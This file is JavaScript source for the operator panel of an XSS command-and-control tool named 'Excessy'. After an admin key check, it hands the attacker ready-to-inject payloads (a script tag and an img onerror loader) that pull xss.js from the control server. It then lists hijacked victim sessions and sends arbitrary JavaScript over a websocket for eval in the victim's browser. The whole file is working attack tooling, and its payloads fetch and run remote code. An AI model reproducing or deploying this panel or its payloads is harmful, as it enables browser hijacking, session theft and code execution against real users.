"use strict";

const API_URL = location.origin;
let cc;
let callbacks = {};

class AttackerCC extends CommunicationChannel {
    onMessage(ws, ev) {
        const msg = JSON.parse(ev.data);

        if (msg.type === 'victim-connected') {
            app.$emit('change-state', 'victim-connected');
        } else if (msg.type === 'eval-result') {
            const { id, data } = msg;
            callbacks[id](data);
        } else if (msg.type === 'sessions') {
            const cb = this.sessionsCallback;
            if (cb) {
                cb(msg.sessions);
            }
        }

    }

    randomId() {
        return 'eval' + Math.random().toString().slice(2);
    }

    sendEval(code, callback) {
        const id = this.randomId();
        const obj = {
            type: 'eval',
            code,
            id
        }

        callbacks[id] = callback;

        this.send(obj);
    }
}

function initializeWebSocket() {
    cc = new AttackerCC(location.origin, localStorage.getItem('sessid'), localStorage.getItem('adminKey'));
}

async function checkAdminKey(adminKey) {
    const headers = new Headers();
    headers.set('X-Admin-Key', adminKey);

    const f = await fetch(API_URL + '/check-admin-key', { headers });
    const resp = await f.json();

    return resp;

}

/*
    This is the first screen a user sees. It just asks to type
    the admin key to use the panel.
*/
Vue.component('admin-key-screen', {
    // language=HTML
    template: `
        <div>
            <p>Hello and welcome to Excessy! Before we move forward, please input your admin key below.</p>
            <form @submit="submit">
                <input style="width: 420px" v-model="adminKey" @keydown="errorMsg = ''" placeholder="Enter admin key here" autofocus>
                <button>Go!</button>
            </form>
            <div class="error" v-if="errorMsg !== ''">{{ errorMsg }}</div>
        </div>
    `,
    data() {
        return {
            adminKey: '',
            errorMsg: ''
        }
    },
    methods: {
        async submit(ev) {
            ev.preventDefault();

            const sess = await checkAdminKey(this.adminKey);
            if (sess.status === 'ok') {
                localStorage.setItem('adminKey', this.adminKey);
                app.$emit('change-state', 'admin-key-set');
            } else {
                this.errorMsg = 'Invalid admin key.';
            }
        }
    }
});


/*
    In `await-for-connection` screen a few things happen:
        1. A websocket connection between the server and the attacker's browser is made.
        2. A unique URL to a victim's script resource is generated and shown to the attacker.
        3. The screen is visible until the victim also makes the websocket connection.
*/
Vue.component('await-for-connection-screen', {
   // language=HTML
   template: `
       <div>
           <p>
               Please use the following script in the XSS. It will make sure that the victim
               will connect to Excessy server.
           </p>
           <p style="padding-left: 60px; background: lightgray">
               &lt;script src="{{ scriptUrl }}">&lt;/script>
           </p>
           <p> ... or ...</p>
           <p style="padding-left: 60px; background: lightgray;overflow-wrap:break-word">
               &lt;img src onerror="sc=document.createElement('script');sc.src='{{scriptUrl}}';document.head.appendChild(sc);"&gt;
           </p>
           <p>
               You can connect for these sessions:
           </p>
           <ul>
               <li style="cursor: pointer" @click="setSession(session)" v-for="session in sessions">
                   id: {{ session.id }}, origin: {{ session.origin }}
               </li>
           </ul>
       </div>
   `,
    data() {
       return {
           scriptUrl: location.origin + '/xss.js',
           sessions: []
       };
    },

    mounted() {
        initializeWebSocket();
        cc.sessionsCallback = (function(sessions) {
            this.sessions = sessions;
        }).bind(this);
    },

    methods: {
       setSession(session) {
           cc.send({ type: 'session', id: session.id });
           app.$emit('change-state', 'victim-connected');
       }
    }

});

/* This is the main application after the victim is connected */
Vue.component('main-app', {
    // language=HTML
    template: `
        <div>
            <h1># Modules</h1>
            <div id="modules-list" style="text-transform: lowercase">
                |
                <span v-for="module in modules">
                    <span  :style="{ fontWeight: (selectedModule === module ? 'bold' : ''), cursor: 'pointer' }"  @click="selectModule(module)">
                        {{ module.name }}
                    </span> |
                </span>
            </div>
            <h1 style="text-transform: uppercase">
                # {{ selectedModule.name }}
            </h1>
            <p>{{ selectedModule.description }}</p>
            <h3>## Code</h3>
            <textarea id="code" class="code" v-model="code"></textarea>
            <h3>## Callback</h3>
            <textarea id="callback" class="code" v-model="callback"></textarea>
            <button @click="execute">Execute</button>
            <h3>## Log</h3>
            <ul>
                <li v-for="entry of reversedLog">
                    [{{ entry.date.toLocaleString() }}]
                    <span v-if="entry.type !== 'html'"> {{ entry.text }} </span>
                    <span v-else v-html="entry.text"></span>
                </li>
            </ul>
        </div>
    `,

    data() {
        (async () => {
           this.modules = jsyaml.safeLoad(await (await fetch('modules.yaml')).text());
           this.selectModule(this.modules[0]);
        })();

        return {
            modules: [],
            selectedModule: {name:'', description: ''},
            code: '',
            callback: '',
            log: []

        }
    },

    computed: {
        reversedLog() {
            return this.log.slice().reverse();
        }
    },

    methods: {
        execute() {
            const callback = eval('((' + this.callback + '))').bind(this, this.addLogEntry.bind(this));

            cc.sendEval(this.code, callback);
            this.addLogEntry('Payload sent.');
        },

        selectModule(module) {
            this.selectedModule = module;
            this.code = module.code;
            this.callback = module.callback;

        },

        addLogEntry(text, type='text') {
            this.log.push({
                text,
                type,
                date: new Date()
            });
        }
    }


});

const app = new Vue({
    el: '#app',
    data: {
        message: '',
        state: 'admin-key'
    },
    created() {
        this.$on('change-state', transition => {
            if (this.state === 'admin-key' && transition === 'admin-key-set') {
                this.state = 'await-for-connection';
            } else if (this.state === 'await-for-connection' && transition === 'victim-connected') {
                this.state = 'main-app';
            }
        });
    },
});
